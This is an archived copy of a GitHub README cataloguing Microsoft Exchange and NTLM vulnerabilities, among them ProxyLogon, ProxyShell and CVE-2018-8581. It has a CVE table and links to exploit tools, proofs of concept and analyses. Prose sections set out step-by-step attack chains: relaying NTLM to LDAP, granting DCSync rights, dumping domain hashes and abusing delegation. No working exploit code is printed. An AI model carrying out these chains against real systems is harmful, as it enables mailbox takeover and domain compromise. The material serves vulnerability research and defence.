---
type: Repository
title: "GitHub - FDlucifer/Proxy-Attackchain: Proxylogon & Proxyshell & Proxyoracle & Proxytoken & All exchange server history vulns summarization :) · GitHub"
resource: "https://github.com/FDlucifer/Proxy-Attackchain"
tags: [repo, ysonet-reference, github]
generated:
  by: ysonet-refs/1
  at: "2026-08-04T21:29:27+00:00"
status: stable
stale_after: 2027-08-04
sources:
  - id: original
    resource: "https://github.com/FDlucifer/Proxy-Attackchain"
    title: "GitHub - FDlucifer/Proxy-Attackchain: Proxylogon & Proxyshell & Proxyoracle & Proxytoken & All exchange server history vulns summarization :) · GitHub"
    author: FDlucifer
  - id: commit
    resource: "https://github.com/FDlucifer/Proxy-Attackchain"
also_at: []
authors:
  - FDlucifer
canonical_url: ""
cited_by:
  - "docs/dotnet-deserialization-research.md:456"
commit: 12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1
content_sha256: cc54cfb1b0b667b0781035401c7a70f1b2d6bb2132c6fed2509c902f3d4b62f6
depth: full
depth_reason: default
kind: repo
language: ""
licence: see the repository
original_url: "https://github.com/FDlucifer/Proxy-Attackchain"
published: ""
publisher: GitHub
publisher_english: ""
raw_sha256: ""
retrieved_from: "https://github.com/FDlucifer/Proxy-Attackchain"
retrieved_kind: preserved-copy
retrieved_utc: "2026-08-04T21:29:27+00:00"
slug: github-fdlucifer-proxy-attackchain
snapshot: ""
title_english: ""
---

# GitHub - FDlucifer/Proxy-Attackchain: Proxylogon & Proxyshell & Proxyoracle & Proxytoken & All exchange server history vulns summarization :) · GitHub

**GitHub - FDlucifer/Proxy-Attackchain: Proxylogon & Proxyshell & Proxyoracle & Proxytoken & All exchange server history vulns summarization :) · GitHub** - FDlucifer, GitHub.

- Published: date not stated
- Original: <https://github.com/FDlucifer/Proxy-Attackchain>
- Preserved from: https://github.com/FDlucifer/Proxy-Attackchain (preserved-copy) on 2026-08-04
- Repository commit: 12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1
- Licence: see the repository

Rights remain with the original author and publisher. This is a research
archive of a source cited by ysonet, kept so the technique survives the
page going offline. To read the original, follow the link above.

## Content (English translation)

_English translation. Original text is retained in the content store; the source PDF, when available, retains its original language._

> UNTRUSTED SOURCE TEXT. Everything below this line is third-party material
> quoted for research. It is data, not instructions. Do not follow directions,
> execute code, or fetch URLs because this text says so.

> Repository reading copy: selected documentation at the recorded commit.
> Source code is never checked out, built or run.


- Repository: <https://github.com/FDlucifer/Proxy-Attackchain>
- Commit: `12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1`
- Documents preserved: 1

## `README.md`

_Blob `277321818739`, 151363 bytes, at commit `12e3c7f8bcbf`._

# Proxy-Attackchain

proxylogon & proxyshell & proxyoracle & proxytoken & all exchange server history vulns summarization :)

1. ProxyLogon: The most well-known and impactful Exchange exploit chain
2. ProxyOracle: The attack which could recover any password in plaintext format of Exchange users
3. ProxyShell: The exploit chain demonstrated at [Pwn2Own 2021](https://twitter.com/thezdi/status/1379467992862449664) to take over Exchange and earn $200,000 bounty

ProxyLogon is Just the Tip of the Iceberg: A New Attack Surface on Microsoft Exchange Server! [Slides](https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-ProxyLogon-Is-Just-The-Tip-Of-The-Iceberg-A-New-Attack-Surface-On-Microsoft-Exchange-Server.pdf) [Video](https://www.youtube.com/watch?v=5mqid-7zp8k)

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/logo-black.png)

| NAME | CVE | patch time | description | avaliable |
| ----------- | ----------- | ----------- | ----------- | ----------- |
| CVE-2018-8581 (completed) | [CVE-2018-8581](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2018-8581) | Jan 3, 2019 | Microsoft Exchange Server SSRF Elevation of Privilege Vulnerability | yes |
| CVE-2018-8302 (completed) | [CVE-2018-8302](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2018-8302) | Aug 16, 2018 | Microsoft Exchange Memory Corruption Vulnerability | yes |
| CVE-2019-1019 (no domain environment available) | [CVE-2019-1019](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2019-1019) | Jun 11, 2019 | Microsoft Windows suffers from an HTTP to SMB NTLM reflection that leads to a privilege escalation. | yes |
| CVE-2019-1040 (no domain environment available) | [CVE-2019-1040](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-1040) | Jun 11, 2019 | Windows NTLM Tampering Vulnerability | yes |
| CVE-2019-1166 (no domain environment available) | [CVE-2019-1166](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2019-1166) | Oct 8, 2019 | Windows NTLM Tampering Vulnerability | yes |
| CVE-2019-1373 | [CVE-2019-1373](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2019-1373) | Nov 12, 2019 | Microsoft Exchange Remote Code Execution Vulnerability | yes |
| CVE-2020-0688 (completed) | [CVE-2020-0688](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2020-0688) | Feb 11, 2020 | Microsoft Exchange Validation Key Remote Code Execution Vulnerability | yes |
| CVE-2020-16875 (completed) [youtube demo](https://www.youtube.com/watch?v=HZ20U4VW2wA) | [CVE-2020-16875](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2020-16875) | Sep 8, 2020 | Microsoft Exchange Server DlpUtils AddTenantDlpPolicy Remote Code Execution | yes |
| CVE-2020-17132 (completed) [youtube demo](https://www.youtube.com/watch?v=S9S2YChZK7k) | [CVE-2020-17132](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2020-17132) | Dec 8, 2020 | Microsoft Exchange Server DlpUtils AddTenantDlpPolicy Remote Code Execution CVE-2020-16875 bypass | yes |
| CVE-2020-17083(completed) [youtube demo](https://www.youtube.com/watch?v=fVoTnd1tBMc) | [CVE-2020-17083](https://msrc.microsoft.com/update-guide/en-us/advisory/CVE-2020-17083) | Nov 10, 2020 | Microsoft Exchange Server Remote Code Execution Vulnerability | yes |
| CVE-2020-17141 & CVE-2020-17143 xxe file read (completed) [youtube demo](https://www.youtube.com/watch?v=SxDCQKpdbhw) | [CVE-2020-17141 & CVE-2020-17143](https://msrc.microsoft.com/update-guide/en-us/advisory/CVE-2020-17143) | Dec 8, 2020 | Microsoft Exchange Server Information Disclosure Vulnerability | yes |
| CVE-2020-17144 (completed) | [CVE-2020-17144](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2020-17144) | Dec 8, 2020 | Microsoft Exchange Remote Code Execution Vulnerability | yes |
| CVE-2021-24085 () | [CVE-2021-24085](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2021-24085) | Feb 9, 2021 | An authenticated attacker can leak a cert file which results in a CSRF token to be generated. | yes |
| CVE-2021-28482 | [CVE-2021-28482]() |  |  | yes |
| ProxyLogon (completed) [youtube demo](https://www.youtube.com/watch?v=KoGodxigujA) | [CVE-2021-26855](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26855) | Mar 02, 2021 | server-side request forgery (SSRF) | yes |
| ProxyLogon (completed) [youtube demo](https://www.youtube.com/watch?v=KoGodxigujA) | [CVE-2021-27065](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-27065) | Mar 02, 2021 | Microsoft.Exchange.Management.DDIService.WriteFileActivity does not validate the extension of the file it writes, so a WebShell can be written through related features whose file content is partly controllable | yes |
| ProxyOracle (completed) | [CVE-2021-31196](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31196) | Jul 13, 2021 | Reflected Cross-Site Scripting | yes |
| ProxyOracle (completed) | [CVE-2021-31195](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31195) | May 11, 2021 | Padding Oracle Attack on Exchange Cookies Parsing | yes |
| ProxyShell (completed) | [CVE-2021-34473](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34473) | Apr 13, 2021 | Pre-auth Path Confusion leads to ACL Bypass | yes |
| ProxyShell (completed) | [CVE-2021-34523](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34523) | Apr 13, 2021 | Elevation of Privilege on Exchange PowerShell Backend | yes |
| ProxyShell (completed) | [CVE-2021-31207](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31207) | May 11, 2021 | Post-auth Arbitrary-File-Write leads to RCE | yes |
| proxytoken (completed) | [CVE-2021-33766](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-33766) | July 13, 2021 | With this vulnerability, an unauthenticated attacker can perform configuration actions on mailboxes belonging to arbitrary users. As an illustration of the impact, this can be used to copy all emails addressed to a target and account and forward them to an account controlled by the attacker. | yes |
| Microsoft Exchange Server Remote Code Execution Vulnerability (completed) | [CVE-2021-42321](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42321) | Nov 17, 2021 | Exchange Deserialization RCE | yes |
| ProxyRelay (no domain environment available) | [CVE-2021-33768](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-33768) | July 13, 2021 | Relay to Exchange FrontEnd | yes |
| ProxyRelay (no domain environment available) | [CVE-2022-21979](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-21979) | October 11, 2022 | Relay to Exchange BackEnd | yes |
| ProxyRelay (no domain environment available) | [CVE-2021-26414](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26414) | June 8, 2021 | Relay to Exchange DCOM | yes |
| ProxyNotShell (completed) | [CVE-2022-41040](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-41040) | November 8, 2022 | Server-Side Request Forgery (SSRF) vulnerability | yes |
| ProxyNotShell (completed) | [CVE-2022-41082](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-41082) | November 8, 2022 | Remote Code Execution (RCE) vulnerability | yes |
| ProxyNotRelay |  |  |  | yes |
| CVE-2022-21969 | [CVE-2022-21969](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-21969) | Jan 11, 2022 | Deserialization Protection Bypasses RCE | yes |
| OWASSRF(CVE-2022-41080) | [CVE-2022-41080]() |  |  | yes |
| TabShell(CVE-2022-41076) | [CVE-2022-41076]() |  |  | yes |
| CVE-2022-23277 (completed) | [CVE-2022-23277](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-23277) | Mar 8, 2022 | Incorrect use of SerializationBinder leads to a bypass of the deserialization allowlist, which gives post-auth RCE. The feature that triggers the vulnerability is the same as for CVE-2021-42321 | yes |
| ProxyNotFound | [CVE-2021-28480](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-28480) | April 13, 2021 | Pre-auth SSRF/ACL bypass | no |
| ProxyNotFound | [CVE-2021-28481](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-28481) | April 13, 2021 | Pre-auth SSRF/ACL bypass | no |
| CVE-2023-21707 (no domain environment available) | [CVE-2023-21707](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-21707) | March 9, 2023 | Microsoft Exchange Server Remote Code Execution Vulnerability | yes |
| proxymaybeshell (completed) | [proxymaybeshell](https://mp.weixin.qq.com/s/mvc-HS1nB2rWzWHLBkYz2A) | September 15, 2023 | proxyshell ssrf + proxynotshell forged X-Rps-CAT token | yes |

- The CU version of the ISO image and the SU security update patch information for every exchange server can be looked up and downloaded from the Microsoft official site below

- [Exchange Server build numbers and release dates](https://learn.microsoft.com/en-us/exchange/new-features/build-numbers-and-release-dates?view=exchserver-2019)

# CVE-2018-8581 (completed)
## CVE-2018-8581 part links

- Information about the exchange versions affected by the vulnerability

``` bash
早期Exchange 2010、Exchange 2013、Exchange 2016
```

Recommended reproduction environment:

``` bash
操作系统windows2008 + Exchange2010SP2
exchange 2013 sp1 + windows 2012
```

This is a mailbox-level lateral movement and privilege escalation vulnerability, a classic and representative NTLM RELAY vulnerability. Once you have the account and password of an ordinary-privilege mailbox, it lets you take over by delegation the mailbox inbox of other users (including the domain administrator)

The vulnerability is essentially caused by an SSRF (Server-Side Request Forgery) vulnerability combined with other communication mechanisms. Exchange lets any user specify the URL they want for a push subscription, and the server will try to send notifications to that URL. The vulnerability exists in the scenario where the Exchange server connects using CredentialCache.DefaultCredentials.

In a real exploitation scenario the attacker only needs a legitimate Exchange mailbox account. By sending a carefully crafted malicious packet to the host where the Exchange Server runs, they trigger the vulnerability, which adds an inbound (inbond) rule to the victim's mailbox, after which all of the victim's inbound (inbond) email is forwarded to the attacker. Because the attack happens between the attacker and the server, in most cases the victim notices almost nothing.

In Exchange Web Service (EWS), CredentialCache.DefaultCredentials runs with NT AUTHORITYSYSTEM privileges. This makes the Exchange Server send an NTLM hash to the attacker's server, and those NTLM hashes can be used for HTTP authentication.

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/CVE-2018-8581.jpg)

These hashes can now be used to access Exchange Web Service (EWS). Because it runs at NT AUTHORITY/SYSTEM level, the attacker can obtain a "privileged" session with TokenSerializationRight. The SSRF vulnerability present in the SOAP request header then lets them impersonate any user, which produces this privilege escalation vulnerability.

Below is an example of a SOAP header that impersonates the administrator user with the SID S-1-5-21-4187549019-2363330540-1546371449-500:

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/CVE-2018-8581-1.jpg)

Attack scenario 1: the attacker uses this vulnerability, with the privileges of a mailbox on the target network, to take over the inbox of anyone on the network, causing serious information disclosure.

Attack scenario 2: the attacker can use this vulnerability to directly control a Windows domain in the target network and control every Windows computer in that domain.

- github exploitation tools
 - [Exchange2domain](https://github.com/Ridter/Exchange2domain)
 - [CVE-2018-8581](https://github.com/WyAtu/CVE-2018-8581)
 - [ZDI adds PoC for CVE-2018-8581](https://github.com/thezdi/PoC/tree/master/CVE-2018-8581)

- There are many detailed articles online about the principle, the exploitation analysis and the reproduction, so it is not reproduced again here
 - [AN INSINCERE FORM OF FLATTERY: IMPERSONATING USERS ON MICROSOFT EXCHANGE](https://www.zerodayinitiative.com/blog/2018/12/19/an-insincere-form-of-flattery-impersonating-users-on-microsoft-exchange)
 - [Microsoft Exchange – Privilege Escalation](https://pentestlab.blog/tag/cve-2018-8581/)
 - [Reproducing the Microsoft Exchange vulnerability CVE-2018-8581](https://www.cnblogs.com/devi1o/articles/13588854.html)
 - [Analysis of the Microsoft Exchange arbitrary user impersonation vulnerability (CVE-2018-8581)](https://paper.seebug.org/804/)
 - [Reproducing CVE-2018-8581](https://www.jianshu.com/p/e081082cbc73)
 - [REPRODUCING THE MICROSOFT EXCHANGE ARBITRARY USER IMPERSONATION VULNERABILITY (CVE-2018-8581)](https://blog.dp7.xyz/post/CVE-2018-8581/)
 - [Using Exchange Server CVE-2018-8581 + pass-the-hash to smash AD](https://blog.51cto.com/mooing/2347487)
 - [Microsoft Exchange vulnerability notes (going for the domain controller) - CVE-2018-8581](https://www.cnblogs.com/iamstudy/articles/Microsoft_Exchange_CVE-2018-8581.html?from=singlemessage)
 - [Exploitation and analysis of the Exchange SSRF vulnerability](https://yoga7xm.top/2020/01/15/8581/)
 - [cve-2018-8581 youtube demo](https://www.youtube.com/watch?v=isy-QjJykss)

# CVE-2018-8302 (completed)
## CVE-2018-8302 part links

- [Demonstrating CVE-2018-8302: A Microsoft Exchange Memory Corruption Vulnerability](https://www.youtube.com/watch?v=OIhxzof22JU)
 - [VOICEMAIL VANDALISM: GETTING REMOTE CODE EXECUTION ON MICROSOFT EXCHANGE SERVER](https://www.zerodayinitiative.com/blog/2018/8/14/voicemail-vandalism-getting-remote-code-execution-on-microsoft-exchange-server)

- Affected versions: exchange <= Aug 14, 2018

A remote code execution vulnerability occurs when the Microsoft Exchange software fails to correctly handle objects in memory. An attacker who successfully exploits it can execute arbitrary code in the context of the System user through .NET BinaryFormatter deserialization. The attacker can then install programs; view, change or delete data; or create new accounts.

Exploiting the vulnerability requires a crafted email to be sent to the vulnerable Exchange server. Combined with UM and voicemail phishing

# CVE-2019-1019 (no domain environment available)
## CVE-2019-1019 part links

- [Near-Ubiquitous Microsoft RCE Bugs Affect All Versions of Windows](https://threatpost.com/critical-microsoft-rce-bugs-windows/145572/)
 - [Microsoft Windows 10.0.17134.648 - HTTP -> SMB NTLM Reflection Leads to Privilege Elevation](https://www.exploit-db.com/exploits/47115)

A security feature bypass vulnerability exists in which NETLOGON messages can obtain the session key and sign messages.

To exploit this vulnerability, an attacker can send a specially crafted authentication request. An attacker who successfully exploits this vulnerability can access another computer with the original user's privileges.

# CVE-2019-1040 (no domain environment available)
## CVE-2019-1040 part links

- [dcpwn](https://github.com/QAX-A-Team/dcpwn)
 - [CVE-2019-1040 with Exchange](https://github.com/Ridter/CVE-2019-1040)
 - [Exploiting CVE-2019-1040 - Combining relay vulnerabilities for RCE and Domain Admin](https://dirkjanm.io/exploiting-CVE-2019-1040-relay-vulnerabilities-for-rce-and-domain-admin/)
 - [CVE-2019-1040-dcpwn](https://github.com/Ridter/CVE-2019-1040-dcpwn)
 - [UltraRelay Updated by Lazaar Sami for the exploit CVE-2019-1040](https://github.com/lazaars/UltraRealy_with_CVE-2019-1040)
 - [CVE-2019-1040](https://www.heresecurity.wiki/heng-xiang-yi-dong/ntlm-zhong-ji-he-zhong-jian-ren-gong-ji/cve-2019-1040)
 - [CVE-2019-1040: Relaying SMB to LDAP - Demo](https://www.youtube.com/watch?v=86EFtshy4xU)
 - [Intranet killer exploitation: the CVE-2019-1040 vulnerability](https://www.anquanke.com/post/id/180379/)
 - [CVE-2019-1040 combined with the printer vulnerability to attack the primary domain controller and use a resource delegation attack against the secondary domain controller](https://www.cnblogs.com/zpchcbd/p/15857942.html)
 - [In-depth analysis of two domain privilege escalation exploits combined with the CVE-2019-1040 vulnerability](https://cloud.tencent.com/developer/article/1987720)
 - [A complete collection of delegation attack knowledge! How fancy can the postures for abusing delegation get? | Technical selection 0121](https://mp.weixin.qq.com/s/GdmnlsKJJXhElA4GuwxTKQ)
 - [Study of the analysis of the CVE-2019-1040 vulnerability](https://blog.csdn.net/qq_43645782/article/details/119672072)
 - [Cve 2019 1040 Intranet Killer](https://syst1m.com/post/cve-2019-1040-intranet-killer/)
 - [Building a domain environment, the principle of CVE-2019-1040 and its reproduction](http://www.sanyuee.top/index.php/archives/545/)

- A deep dive into the technical principles of ntlm relay attacks and domain penetration

 - [Derbycon - The Unintended Risks of Trusting Active Directory](https://www.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory)
 - [The worst of both worlds: Combining NTLM Relaying and Kerberos delegation](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/)
 - [Abusing Exchange: One API call away from Domain Admin](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/)
 - [Another Word on Delegation](https://posts.specterops.io/another-word-on-delegation-10bdbe3cd94a)
 - [mitm6 – compromising IPv4 networks via IPv6](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/)
 - [Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
 - ["Relaying" Kerberos - Having fun with unconstrained delegation](https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/)
 - [Escalating privileges with ACLs in Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
 - [Relaying credentials everywhere with ntlmrelayx](https://blog.fox-it.com/2017/05/09/relaying-credentials-everywhere-with-ntlmrelayx/)
 - [D2T2 - NTLM Relay Is Dead Long Live NTLM Relay - Jianing Wang and Junyu Zhou](https://github.com/FDlucifer/Proxy-Attackchain/blob/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/research-pdfs/D2T2%20-%20NTLM%20Relay%20Is%20Dead%20Long%20Live%20NTLM%20Relay%20-%20Jianing%20Wang%20and%20Junyu%20Zhou.pdf)
 - [An ACE Up the Sleeve: Designing Active Directory DACL Backdoors](https://github.com/FDlucifer/Proxy-Attackchain/blob/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/research-pdfs/us-17-Robbins-An-ACE-Up-The-Sleeve-Designing-Active-Directory-DACL-Backdoors-wp.pdf)
 - [Toxic Waste Removal for Active Directory](https://github.com/FDlucifer/Proxy-Attackchain/blob/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/research-pdfs/04262018-Webcast-Toxic-Waste-Removal-by-Andy-Robbins.pdf)
 - [aclpwn - Active Directory ACL exploitation with BloodHound](https://www.slideshare.net/DirkjanMollema/aclpwn-active-directory-acl-exploitation-with-bloodhound)
 - [Remote NTLM relaying through meterpreter on Windows port 445](https://diablohorn.com/2018/08/25/remote-ntlm-relaying-through-meterpreter-on-windows-port-445/)
 - [NTLM Relay](https://en.hackndo.com/ntlm-relay/)
 - [Relay](https://www.thehacker.recipes/a-d/movement/ntlm/relay)
 - [MITM and coerced auths](https://www.thehacker.recipes/a-d/movement/mitm-and-coerced-authentications)
 - [rough PoC to connect to spoolss to elicit machine account authentication](https://gist.github.com/3xocyte/cfaf8a34f76569a8251bde65fe69dccc)
 - [Kerberos unconstrained delegation abuse toolkit](https://github.com/dirkjanm/krbrelayx)
 - [NTLM Relay](https://wuhash.gitee.io/2020-09-01.html)

A tampering vulnerability exists in Microsoft Windows when a man-in-the-middle attacker is able to successfully bypass the NTLM MIC (Message Integrity Check) protection. An attacker who successfully exploits this vulnerability gains the ability to downgrade NTLM security features.

To exploit this vulnerability, the attacker needs to tamper with the NTLM exchange. The attacker can then modify the flags of the NTLM message without invalidating the signature.

The CVE-2019-1040 vulnerability makes it possible to modify the NTLM authentication packet without invalidating the authentication, which lets an attacker remove the flag that prevents relaying from SMB to LDAP

### Attacking the domain Exchange Server / administrator

- Prerequisites

A. The Exchange server can be any version (including versions patched for PrivExchange). The only requirement is that when installed in shared permissions or RBAC mode, Exchange has high privileges by default.

B. Any account in the domain. (Because the only requirement for producing a SpoolService error is any authenticated account in the domain)

C. The essence of the CVE-2019-1040 vulnerability is a flaw in the integrity check of NTLM packets, so the NTLM authentication packet can be modified without invalidating the authentication. In this attack chain the attacker removes the flag in the packet that prevents forwarding from SMB to LDAP.

D. Craft a request that makes the Exchange Server authenticate to the attacker, and relay that authentication to the domain controller over LDAP, so that operations can be performed in Active Directory with the privileges of the relayed victim. For example, granting DCSync rights to the attacker's account.

E. If you have a user in a trusted but completely different AD forest, exactly the same attack can be performed in the domain. (Because any authenticated user can trigger the SpoolService reverse connection)

- Exploitation attack chain

1. Using any account in the domain, connect over SMB to the ExchangeServer being attacked and specify the relay attack server. At the same time the SpoolService error must be used to trigger the reverse SMB connection.

2. The relayed server connects back to the attacker's host over SMB, then ntlmrelayx is used to relay to LDAP the SMB request packet whose NTLM authentication data was modified using the CVE-2019-1040 vulnerability.

3. Using the relayed LDAP authentication, the Exchange Server can now grant DCSync rights to the attacker's account.

4. The attacker's account uses DCSync to dump the password hashes of all domain users in the AD domain (including the domain administrator's hash, at which point the whole domain is taken).

### Attacking the domain AD Server / administrator

- Prerequisites

A. The server can be any unpatched Windows Server or workstation, including a domain controller. When targeting a domain controller, at least one vulnerable domain controller is needed to relay the authentication to, and the SpoolService error has to be triggered on a domain controller.

B. Control of a computer account is required. This can be a computer account whose password the attacker obtained because they are already Administrator on the workstation, or a computer account created by the attacker, since by default any account in Active Directory can be abused to create such accounts.

C. The essence of the CVE-2019-1040 vulnerability is a flaw in the integrity check of NTLM packets, so the NTLM authentication packet can be modified without invalidating the authentication. In this attack chain the attacker removes the flag in the packet that prevents forwarding from SMB to LDAP.

D. By abusing resource-based constrained Kerberos delegation, the attacker can be granted the right to impersonate any domain user on the AD domain controller server. Including domain administrator privileges.

E. If you have a user in a trusted but completely different AD forest, exactly the same attack can be performed in the domain. (Because any authenticated user can trigger the SpoolService reverse connection)

- Exploitation attack chain

1. Using any account in the domain, connect over SMB to the domain controller server being attacked and specify the relay attack server. At the same time the SpoolService error must be used to trigger the reverse SMB connection.

2. The relayed server connects back to the attacker's host over SMB, then ntlmrelayx is used to relay to LDAP the SMB request packet whose NTLM authentication data was modified using the CVE-2019-1040 vulnerability.

3. Using the relayed LDAP authentication, grant resource-based constrained delegation rights over the victim server to a computer account under the attacker's control.

4. The attacker can now authenticate as any user on the AD server. Including the domain administrator.

- Affected versions:

``` bash
Windows 10 for 32-bit Systems
Windows 10 for x64-based Systems
Microsoft Windows 10 Version 1607 for 32-bit Systems
Microsoft Windows 10 Version 1607 for x64-based Systems
Microsoft Windows 10 version 1703 for 32-bit Systems
Microsoft Windows 10 version 1703 for x64-based Systems
Microsoft Windows 10 version 1709 for 32-bit Systems
Microsoft Windows 10 Version 1709 for ARM64-based Systems
Windows 10 Version 1709 for x64-based Systems
Microsoft Windows 10 Version 1803 for 32-bit Systems
Microsoft Windows 10 Version 1803 for ARM64-based Systems
Microsoft Windows 10 Version 1803 for x64-based Systems
Windows 10 Version 1809 for 32-bit Systems
Windows 10 Version 1809 for ARM64-based Systems
Windows 10 Version 1809 for x64-based Systems
Windows 10 Version 1903 for 32-bit Systems
Windows 10 Version 1903 for ARM64-based Systems
Windows 10 Version 1903 for x64-based Systems
Windows 7 for 32-bit Systems Service Pack 1
Windows 7 for x64-based Systems Service Pack 1
Windows 8.1 for 32-bit systems
Windows 8.1 for x64-based systems
Microsoft Windows RT 8.1
Windows Server 2008 for 32-bit Systems Service Pack 2
Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)
Windows Server 2008 for Itanium-Based Systems Service Pack 2
Windows Server 2008 for x64-based Systems Service Pack 2
Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)
Windows Server 2008 R2 for Itanium-Based Systems Service Pack 1
Windows Server 2008 R2 for x64-based Systems Service Pack 1
Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
Windows Server 2012
Windows Server 2012 (Server Core installation)
Windows Server 2012 R2
Windows Server 2012 R2 (Server Core installation)
Microsoft Windows Server 2016
Windows Server 2016 (Server Core installation)
Microsoft Windows Server 2019
Windows Server 2019 (Server Core installation)
Windows Server
version 1803 (Server Core Installation)
Windows Server
version 1903 (Server Core installation)
```

# CVE-2019-1166 (no domain environment available)
## CVE-2019-1166 part links

 - [drop-the-mic-2-active-directory-open-to-more-ntlm-attacks](https://www.preempt.com/blog/drop-the-mic-2-active-directory-open-to-more-ntlm-attacks/)
 - [Active Directory Open to More NTLM Attacks: Drop The MIC 2 (CVE 2019-1166) and Exploiting LMv2 Clients (CVE-2019-1338)](https://www.crowdstrike.com/blog/active-directory-ntlm-attack-security-advisory/)

# CVE-2019-1373
## CVE-2019-1373 part links

There is basically no public detailed material online

# CVE-2020-0688 (completed)
## CVE-2020-0688 part links

- [Analysis and reproduction of the CVE-2020-0688-Exchange- remote code execution](https://fdlucifer.github.io/2020/10/12/cve-2020-0688/)
 - [github cve-2020-0688 weaponized tool](https://github.com/search?q=CVE-2020-0688&type=repositories)
 - [DotNet security - ViewState deserialization exploitation](https://mp.weixin.qq.com/s/UGFu7zLDUMaCGNYlYm3WRw)
 - [Hunting Down MS Exchange Attacks. Part 2 (CVE-2020-0688, CVE-2020-16875, CVE-2021-24085)](https://cyberpolygon.com/materials/okhota-na-ataki-ms-exchange-chast-2-cve-2020-0688-cve-2020-16875-cve-2021-24085/)
 - [CVE-2020-0688: REMOTE CODE EXECUTION ON MICROSOFT EXCHANGE SERVER THROUGH FIXED CRYPTOGRAPHIC KEYS](https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys)
 - [exploit-db Microsoft Exchange 2019 15.2.221.12 - Authenticated Remote Code Execution](https://www.exploit-db.com/exploits/48153)
 - [Exchange Exploit Case Study – CVE-2020-0688](https://community.netwitness.com/t5/netwitness-community-blog/exchange-exploit-case-study-cve-2020-0688/ba-p/517916)
 - [Weaponizing CVE-2020-0688 and things about .net deserialization vulnerabilities](https://www.zcgonvh.com/post/weaponizing_CVE-2020-0688_and_about_dotnet_deserialize_vulnerability.html)
 - [[Practical] A record of exploiting CVE-2020-0688](https://www.modb.pro/db/143283)
 - [Exploiting ViewState Deserialization using Blacklist3r and YSoSerial.Net](https://notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net)
 - [Deep Dive into .NET ViewState deserialization and its exploitation](https://swapneildash.medium.com/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817)

- Information about the exchange versions affected by the vulnerability

``` bash
MS Exchange Server 2010 SP3 up to 2019 CU4
```

This module exploits a .net serialization vulnerability in the Exchange Control Panel (ECP). The vulnerability is caused by Microsoft Exchange Server not randomizing the keys on a per-installation basis, so they all use the same validationKey and decryptionKey values. With these values an attacker can craft a special ViewState and use .net deserialization as NT_AUTHORITY\SYSTEM to execute operating system commands.

Deserialization of viewstate became the first vulnerability that could execute commands directly on an exchange server, so when it came out its impact was very large and very representative

There are also many analysis articles online and many open source weaponized implementations, so not much more is written here

# CVE-2020-16875 (completed)
## CVE-2020-16875 part links

- [Microsoft Exchange Server DlpUtils AddTenantDlpPolicy Remote Code Execution](https://packetstormsecurity.com/files/159210/Microsoft-Exchange-Server-DlpUtils-AddTenantDlpPolicy-Remote-Code-Execution.html)
 - [CVE-2020-16875 python poc](https://srcincite.io/pocs/cve-2020-16875.py.txt)
 - [CVE-2020-16875 powershell poc](https://srcincite.io/pocs/cve-2020-16875.ps1.txt)
 - [CVE-2020-16875: reproducing the Microsoft Exchange RCE](https://cloud.tencent.com/developer/article/1704777)
 - [Exchange vulnerability analysis series CVE-2020-16875](https://www.anquanke.com/post/id/219091)
